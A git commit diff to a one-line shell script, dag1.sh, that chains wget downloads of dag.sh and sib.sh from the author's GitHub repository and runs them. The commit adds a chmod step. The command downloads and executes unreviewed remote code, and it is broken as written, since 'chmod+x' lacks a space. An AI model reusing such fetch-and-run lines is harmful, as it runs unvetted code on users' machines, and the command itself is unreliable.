107304b57fc78698df059b4daba26ef7502c8234
uveshV <87410093+uveshV@users.noreply.github.com>
2021-07-17 13:39:21 +0545

    dag1.sh

--- dag1.sh
+++ dag1.sh
@@ -1,1 +1,1 @@
-wget https://raw.githubusercontent.com/uveshV/project-a/main/dag.sh && ./dag.sh && wget https://raw.githubusercontent.com/uveshV/project-a/main/sib.sh && chmod+x sib.sh && ./sib.sh
+wget https://raw.githubusercontent.com/uveshV/project-a/main/dag.sh && chmod+x dag.sh && ./dag.sh && wget https://raw.githubusercontent.com/uveshV/project-a/main/sib.sh && chmod+x sib.sh && ./sib.sh
